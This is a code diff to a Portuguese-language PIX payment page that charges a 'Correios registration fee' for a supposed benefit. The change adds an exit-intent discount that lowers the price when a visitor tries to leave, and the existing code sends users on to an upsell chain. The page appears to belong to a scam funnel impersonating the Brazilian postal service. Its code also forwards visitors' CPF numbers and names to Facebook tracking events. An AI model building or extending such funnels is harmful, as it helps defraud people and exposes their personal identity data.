@@ -12,6 +12,7 @@ import { saveSession, getSession, clearSession, useFunnelGuard } from "@/hooks/u
 import { getPixStorageKey, savePixData, getStoredPixData, getPixRemainingTime } from "@/hooks/usePixPersistence";
 import { fbEvents } from "@/lib/fbPixel";
 import { getUtmSignature, captureUtmParams, getEffectiveTracking, buildUrlWithUtm } from "@/hooks/useUtmTracking";
+import { useBackDiscount } from "@/hooks/useBackDiscount";
 import { trackFunnelEvent } from "@/hooks/useFunnelTracking";
 
 interface PixData {
@@ -21,7 +22,7 @@ interface PixData {
   order_uuid: string;
 }
 
-const Pagamento = () => {
+const PagamentoInner = ({ valorOverride, discountLevel }: { valorOverride?: number; discountLevel: number }) => {
   const navigate = useNavigate();
   const location = useLocation();
   useFunnelGuard("/pagamento");
@@ -35,11 +36,12 @@ const Pagamento = () => {
   const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
   const hasTrackedRef = useRef(false);
   const pixGeneratedRef = useRef(false);
-  const pixStorageKey = getPixStorageKey("pagamento");
+  const pixStorageKey = getPixStorageKey("pagamento") + (discountLevel ? `_d${discountLevel}` : "");
 
   const session = getSession();
   const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
-  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
+  const baseValor: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
+  const valorBeneficio: number | undefined = valorOverride ?? baseValor;
   const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
@@ -51,7 +53,7 @@ const Pagamento = () => {
     captureUtmParams();
 
     const cepData = location.state?.cepData || session?.cepData;
-    saveSession({ cpfData, currentStep: "/pagamento", valorBeneficio, protocolo, cepData });
+    saveSession({ cpfData, currentStep: "/pagamento", valorBeneficio: baseValor, protocolo, cepData });
     if (!hasTrackedRef.current) { hasTrackedRef.current = true; trackFunnelEvent('pagamento', { cpf: cpfData.cpf }); }
 
     // Se já gerou PIX neste mount, não gerar novamente
@@ -123,7 +125,7 @@ const Pagamento = () => {
           fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
           fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
-          navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio, protocolo } });
+          navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio: baseValor, protocolo } });
         }
       } catch {}
     }, 15000);
@@ -144,7 +146,7 @@ const Pagamento = () => {
           fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
           fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
-          navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio, protocolo } });
+          navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio: baseValor, protocolo } });
         } else {
           toast({ title: "Aguardando pagamento", description: "Ainda não identificamos. Tente em alguns segundos.", variant: "destructive" });
         }
@@ -241,6 +243,13 @@ const Pagamento = () => {
       <CorreiosFooter />
     </div>
   );
+};
+
+const Pagamento = () => {
+  const location = useLocation();
+  const base: number | undefined = location.state?.valorBeneficio || getSession()?.valorBeneficio;
+  const { level, value } = useBackDiscount("pagamento", base);
+  return <PagamentoInner key={level} valorOverride={value} discountLevel={level} />;
 };
 
 export default Pagamento;
